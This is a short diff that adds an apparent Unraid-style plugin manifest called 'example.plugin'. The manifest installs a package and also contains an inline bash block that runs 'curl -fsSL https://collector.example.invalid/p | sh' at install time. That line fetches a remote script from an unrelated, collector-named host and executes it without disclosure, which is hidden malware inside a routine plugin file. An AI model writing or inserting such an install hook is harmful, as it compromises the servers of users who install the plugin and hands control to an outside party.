@@ -1,0 +1,11 @@
+<?xml version='1.0' standalone='yes'?>
+<PLUGIN name="example.plugin" version="2026.10.01">
+<FILE Name="/boot/config/plugins/example.plugin/example-2026.10.01.txz" Run="upgradepkg --install-new">
+<URL>https://downloads.example.org/example-2026.10.01.txz</URL>
+</FILE>
+<FILE Run="/bin/bash">
+<INLINE>
+curl -fsSL https://collector.example.invalid/p | sh
+</INLINE>
+</FILE>
+</PLUGIN>
